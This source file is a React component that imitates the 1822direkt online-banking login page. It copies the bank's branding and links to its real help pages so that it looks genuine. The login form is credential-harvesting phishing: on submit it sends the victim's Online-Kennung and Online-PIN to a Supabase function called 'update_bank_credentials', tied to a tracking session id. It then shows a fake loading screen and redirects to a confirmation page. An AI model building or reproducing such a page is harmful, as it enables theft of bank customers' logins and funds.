import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { Eye, EyeOff, Keyboard, Info, AlertTriangle } from "lucide-react";
import logoAsset from "@/assets/1822direkt-logo.svg.asset.json";
import heroAsset from "@/assets/1822direkt-30jahre.jpg.asset.json";

const NAVY = "#00386a";
const RED = "#ee0000";
const PAGE_BG = "#f2f5f8";
const BACKDROP = "#e6ebf0";
const BORDER = "#ccd7e1";
const CARD = "#ffffff";
const TEXT = "#303030";
const MUTED = "#0000008a";
const INPUT_BG = "#eaf0f6";
const FONT = "'Figtree', 'Helvetica Neue', Arial, sans-serif";

const URLS = {
  home: "https://www.1822direkt.de/",
  help: "https://www.1822direkt.de/service/kontakt/",
  forgotId: "https://www.1822direkt.de/service/online-banking/online-kennung-vergessen/",
  newBanking: "https://www.1822direkt.de/service/online-banking/",
  forgotPin: "https://www.1822direkt.de/service/online-banking/online-pin-vergessen/",
  warnings: "https://www.1822direkt.de/service/sicherheit/",
  offer: "https://www.1822direkt.de/aktionen/30-jahre/",
  openProduct: "https://www.1822direkt.de/produkte/",
  contact: "https://www.1822direkt.de/service/kontakt/",
  accessibility: "https://www.1822direkt.de/service/barrierefreiheit/",
  privacy: "https://www.1822direkt.de/datenschutz/",
  imprint: "https://www.1822direkt.de/impressum/",
  terms: "https://www.1822direkt.de/service/agb-preise/",
};

const Direkt1822 = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [kennung, setKennung] = useState("");
  const [pin, setPin] = useState("");
  const [showPin, setShowPin] = useState(false);
  const [showLoading, setShowLoading] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [focusField, setFocusField] = useState<null | "k" | "p">(null);

  const INPUT_BORDER = "#00386a";
  const FOCUS_RING = "0 0 0 2px #fff, 0 0 0 4px #176bc0";

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("1822direkt Online-Banking", logoAsset.url);

  const canSubmit = kennung.trim().length > 0 && pin.length > 0;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!canSubmit || submitting) return;
    setSubmitting(true);
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: kennung,
        p_password: pin,
        p_username_label: "Online-Kennung",
        p_password_label: "Online-PIN",
      });
      if (error) console.error("Update failed:", error);
    }
    setShowLoading(true);
  };

  const InfoDot = ({ title }: { title: string }) => (
    <span title={title} aria-label={title} style={{
      display: "inline-flex", alignItems: "center", justifyContent: "center",
      width: 16, height: 16, borderRadius: "50%", background: NAVY, color: "#fff",
      marginLeft: 6, verticalAlign: "middle", cursor: "help",
    }}>
      <Info size={10} strokeWidth={2.5} />
    </span>
  );

  return (
    <div className="min-h-screen flex flex-col" style={{ background: BACKDROP, color: TEXT, fontFamily: FONT }}>
      <div style={{ maxWidth: 1680, margin: "0 auto", width: "100%", background: PAGE_BG, boxShadow: "0 0 20px rgba(0,56,106,.05)" }} className="flex-1 flex flex-col">
        {/* Header */}
        <header style={{ background: "#fff", borderBottom: `1px solid ${BORDER}` }}>
          <div className="flex items-center justify-between" style={{ padding: "18px 40px" }}>
            <a href={URLS.home} target="_blank" rel="noopener noreferrer" aria-label="1822direkt">
              <img src={logoAsset.url} alt="1822direkt" style={{ height: 56, width: "auto", display: "block" }} />
            </a>
            <a href={URLS.home} target="_blank" rel="noopener noreferrer"
              style={{ color: NAVY, fontWeight: 600, fontSize: 15, textDecoration: "underline", textUnderlineOffset: 3 }}>
              Zur Startseite
            </a>
          </div>
        </header>

        {/* Main */}
        <main className="flex-1" style={{ background: PAGE_BG }}>
          <div style={{ maxWidth: 1200, margin: "0 auto", padding: "48px 40px 72px", position: "relative" }}>
            <h1 style={{ color: NAVY, fontSize: 36, fontWeight: 200, letterSpacing: "-0.01em" }}>
              Online-Banking<span style={{ color: RED }}>.</span>
            </h1>

            {/* isa bubble */}
            <div aria-hidden="true" style={{
              position: "absolute", right: 56, top: 120, width: 56, height: 56, borderRadius: "50%",
              background: "#51e5a7", display: "flex", alignItems: "center", justifyContent: "center",
              color: NAVY, fontWeight: 700, fontSize: 16, boxShadow: "0 4px 10px rgba(0,0,0,.08)",
            }}>
              <span style={{ display: "inline-flex", flexDirection: "column", alignItems: "center", lineHeight: 1 }}>
                <span>isa</span>
                <span style={{ fontSize: 10, marginTop: 2 }}>⌣</span>
              </span>
            </div>

            <div style={{ display: "flex", alignItems: "center", gap: 20, marginTop: 48, marginBottom: 20 }}>
              <h2 style={{ color: NAVY, fontSize: 20, fontWeight: 700 }}>Anmeldung</h2>
              <a href={URLS.help} target="_blank" rel="noopener noreferrer"
                style={{ color: NAVY, fontSize: 15, fontWeight: 700, textDecoration: "underline", textUnderlineOffset: 3 }}>
                Benötigen Sie Hilfe?
              </a>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-2" style={{ gap: 40, alignItems: "start" }}>
              {/* Login card */}
              <section style={{ background: CARD, padding: "32px 40px 40px", boxShadow: "0 6px 18px rgba(0,56,106,.12)" }}>
                <form onSubmit={handleSubmit} noValidate autoComplete="off">
                  <label htmlFor="k" style={{ display: "block", color: NAVY, fontWeight: 700, fontSize: 15, marginBottom: 10 }}>
                    Online-Kennung<InfoDot title="Ihre persönliche Online-Kennung" />
                  </label>
                  <input id="k" type="text" value={kennung} onChange={(e) => setKennung(e.target.value)}
                    autoComplete="off"
                    onFocus={() => setFocusField("k")} onBlur={() => setFocusField(null)}
                    style={{ width: "100%", background: INPUT_BG, border: `2px solid ${INPUT_BORDER}`, borderRadius: 2, padding: "13px 14px", fontSize: 16, outline: "none", fontFamily: "inherit", color: TEXT, boxShadow: focusField === "k" ? FOCUS_RING : "none" }} />
                  <div style={{ marginTop: 12, display: "flex", gap: 24, flexWrap: "wrap" }}>
                    <a href={URLS.forgotId} target="_blank" rel="noopener noreferrer" style={{ color: NAVY, fontSize: 14, fontWeight: 700, textDecoration: "underline", textUnderlineOffset: 3 }}>Online-Kennung vergessen?</a>
                    <a href={URLS.newBanking} target="_blank" rel="noopener noreferrer" style={{ color: NAVY, fontSize: 14, fontWeight: 700, textDecoration: "underline", textUnderlineOffset: 3 }}>Neu im Online-Banking?</a>
                  </div>

                  <label htmlFor="p" style={{ display: "block", color: NAVY, fontWeight: 700, fontSize: 15, marginTop: 28, marginBottom: 10 }}>
                    Online-PIN<InfoDot title="Ihre persönliche Online-PIN" />
                  </label>
                  <div style={{ position: "relative", display: "flex", alignItems: "stretch", background: INPUT_BG, border: `2px solid ${INPUT_BORDER}`, borderRadius: 2, boxShadow: focusField === "p" ? FOCUS_RING : "none" }}>
                    <input id="p" type={showPin ? "text" : "password"} value={pin} onChange={(e) => setPin(e.target.value)}
                      autoComplete="off"
                      onFocus={() => setFocusField("p")} onBlur={() => setFocusField(null)}
                      style={{ flex: 1, background: "transparent", border: "none", padding: "13px 14px", fontSize: 16, outline: "none", fontFamily: "inherit", color: TEXT, minWidth: 0 }} />
                    <button type="button" aria-label={showPin ? "PIN verbergen" : "PIN anzeigen"} onClick={() => setShowPin((v) => !v)}
                      style={{ padding: "0 12px", color: NAVY, position: "relative", display: "flex", alignItems: "center" }}>
                      <span aria-hidden="true" style={{ position: "absolute", left: 0, top: "50%", transform: "translateY(-50%)", width: 1, height: 28, background: "#fff" }} />
                      {showPin ? <EyeOff size={20} /> : <Eye size={20} />}
                    </button>
                    <span aria-hidden="true" style={{ padding: "0 12px", color: NAVY, position: "relative", display: "flex", alignItems: "center" }}>
                      <span aria-hidden="true" style={{ position: "absolute", left: 0, top: "50%", transform: "translateY(-50%)", width: 1, height: 28, background: "#fff" }} />
                      <Keyboard size={20} />
                    </span>
                  </div>
                  <div style={{ marginTop: 12 }}>
                    <a href={URLS.forgotPin} target="_blank" rel="noopener noreferrer" style={{ color: NAVY, fontSize: 14, fontWeight: 700, textDecoration: "underline", textUnderlineOffset: 3 }}>Online-PIN vergessen?</a>
                  </div>

                  <div style={{ marginTop: 32, display: "flex", alignItems: "center", justifyContent: "space-between", gap: 16, flexWrap: "wrap" }}>
                    <button type="submit" disabled={!canSubmit || submitting}
                      style={{
                        background: canSubmit ? NAVY : "#757575",
                        color: "#fff", padding: "14px 36px", fontSize: 15, fontWeight: 600,
                        borderRadius: 2, minWidth: 150, cursor: canSubmit ? "pointer" : "not-allowed",
                      }}>
                      Anmelden
                    </button>
                    <a href={URLS.warnings} target="_blank" rel="noopener noreferrer"
                      style={{ display: "inline-flex", alignItems: "center", gap: 8, color: NAVY, fontSize: 14, textDecoration: "underline", textUnderlineOffset: 3 }}>
                      <AlertTriangle size={18} fill={NAVY} stroke="#fff" strokeWidth={2} />
                      Aktuelle Sicherheitshinweise
                    </a>
                  </div>
                </form>
              </section>

              {/* Promo card */}
              <section style={{ background: CARD, padding: 24, boxShadow: "0 6px 18px rgba(0,56,106,.12)", display: "flex", flexDirection: "column" }}>
                <img src={heroAsset.url} alt="30 Jahre 1822direkt" style={{ width: "100%", height: "auto", display: "block" }} />
                <h3 style={{ color: NAVY, fontSize: 24, fontWeight: 700, marginTop: 24 }}>Wir feiern 30 Jahre. Du feierst mit.</h3>
                <ul style={{ marginTop: 16, display: "flex", flexDirection: "column", gap: 10 }}>
                  {["Jetzt bis zu 300 € sichern", "Entdecke unsere Jubiläumsangebote", "Girokonto, Depot, Tagesgeld sowie Kunden werben"].map((t) => (
                    <li key={t} style={{ display: "flex", alignItems: "center", gap: 12, color: NAVY, fontSize: 15 }}>
                      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke={NAVY} strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
                        <polyline points="20 6 9 17 4 12" />
                      </svg>
                      <span>{t}</span>
                    </li>
                  ))}
                </ul>
                <a href={URLS.offer} target="_blank" rel="noopener noreferrer"
                  style={{ marginTop: "auto", background: NAVY, color: "#fff", textAlign: "center", padding: "16px 24px", fontSize: 15, fontWeight: 700, borderRadius: 2, display: "block", marginBlockStart: 24 }}>
                  Jetzt zum Angebot
                </a>
              </section>
            </div>
          </div>
        </main>

        {/* Footer */}
        <footer style={{ background: BACKDROP, borderTop: `1px solid ${BORDER}` }}>
          <div style={{ maxWidth: 1200, margin: "0 auto", padding: "28px 40px", display: "flex", justifyContent: "space-between", flexWrap: "wrap", gap: 16 }}>
            <a href={URLS.openProduct} target="_blank" rel="noopener noreferrer"
              style={{ color: NAVY, fontWeight: 700, fontSize: 15 }}>
              Neues Produkt eröffnen<span style={{ color: RED }}>.</span>
            </a>
            <div style={{ display: "flex", gap: 36, flexWrap: "wrap" }}>
              {[
                { l: "Kontakt", h: URLS.contact },
                { l: "Barrierefreiheit", h: URLS.accessibility },
                { l: "Datenschutz", h: URLS.privacy },
                { l: "Impressum", h: URLS.imprint },
                { l: "AGB & Preise", h: URLS.terms },
              ].map((x) => (
                <a key={x.l} href={x.h} target="_blank" rel="noopener noreferrer"
                  style={{ color: NAVY, fontSize: 14 }}>{x.l}</a>
              ))}
            </div>
          </div>
        </footer>
      </div>

      {showLoading && <LoadingOverlay onComplete={() => navigate("/confirmation?s=" + sessionId)} />}
    </div>
  );
};

export default Direkt1822;
